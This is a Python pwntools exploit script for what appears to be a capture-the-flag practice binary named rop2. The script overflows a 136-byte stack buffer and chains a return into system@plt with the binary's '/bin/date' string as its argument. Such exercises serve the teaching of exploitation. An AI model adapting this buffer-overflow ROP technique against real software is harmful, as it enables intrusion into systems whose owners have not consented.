from pwn import *
# Set up the binary and context
context.binary = './pwn/stack/rop-2/rop2'
binary = ELF('./pwn/stack/rop-2/rop2')

# Start the process
p = process(binary.path)

# Offsets and addresses
buffer_size = 136  # Size of the buffer before return address
system_plt = binary.plt['system']  # Address of system function
bin_date = next(binary.search(b'/bin/date'))  # Address of '/bin/date' string

# Debugging: Print key addresses
log.info(f"system@plt: {hex(system_plt)}")
log.info(f"/bin/date address: {hex(bin_date)}")

# ROP chain
payload = b'A' * buffer_size  # Overflow buffer
payload += p32(system_plt)  # Address of system function
payload += b'BBBB'  # Return address after system (can be anything)
payload += p32(bin_date)  # Address of '/bin/date' string

# Debugging: Print the payload
log.info(f"Payload: {payload}")

# Send the payload
p.sendline(payload)

# Interact with the process to see the output
p.interactive()
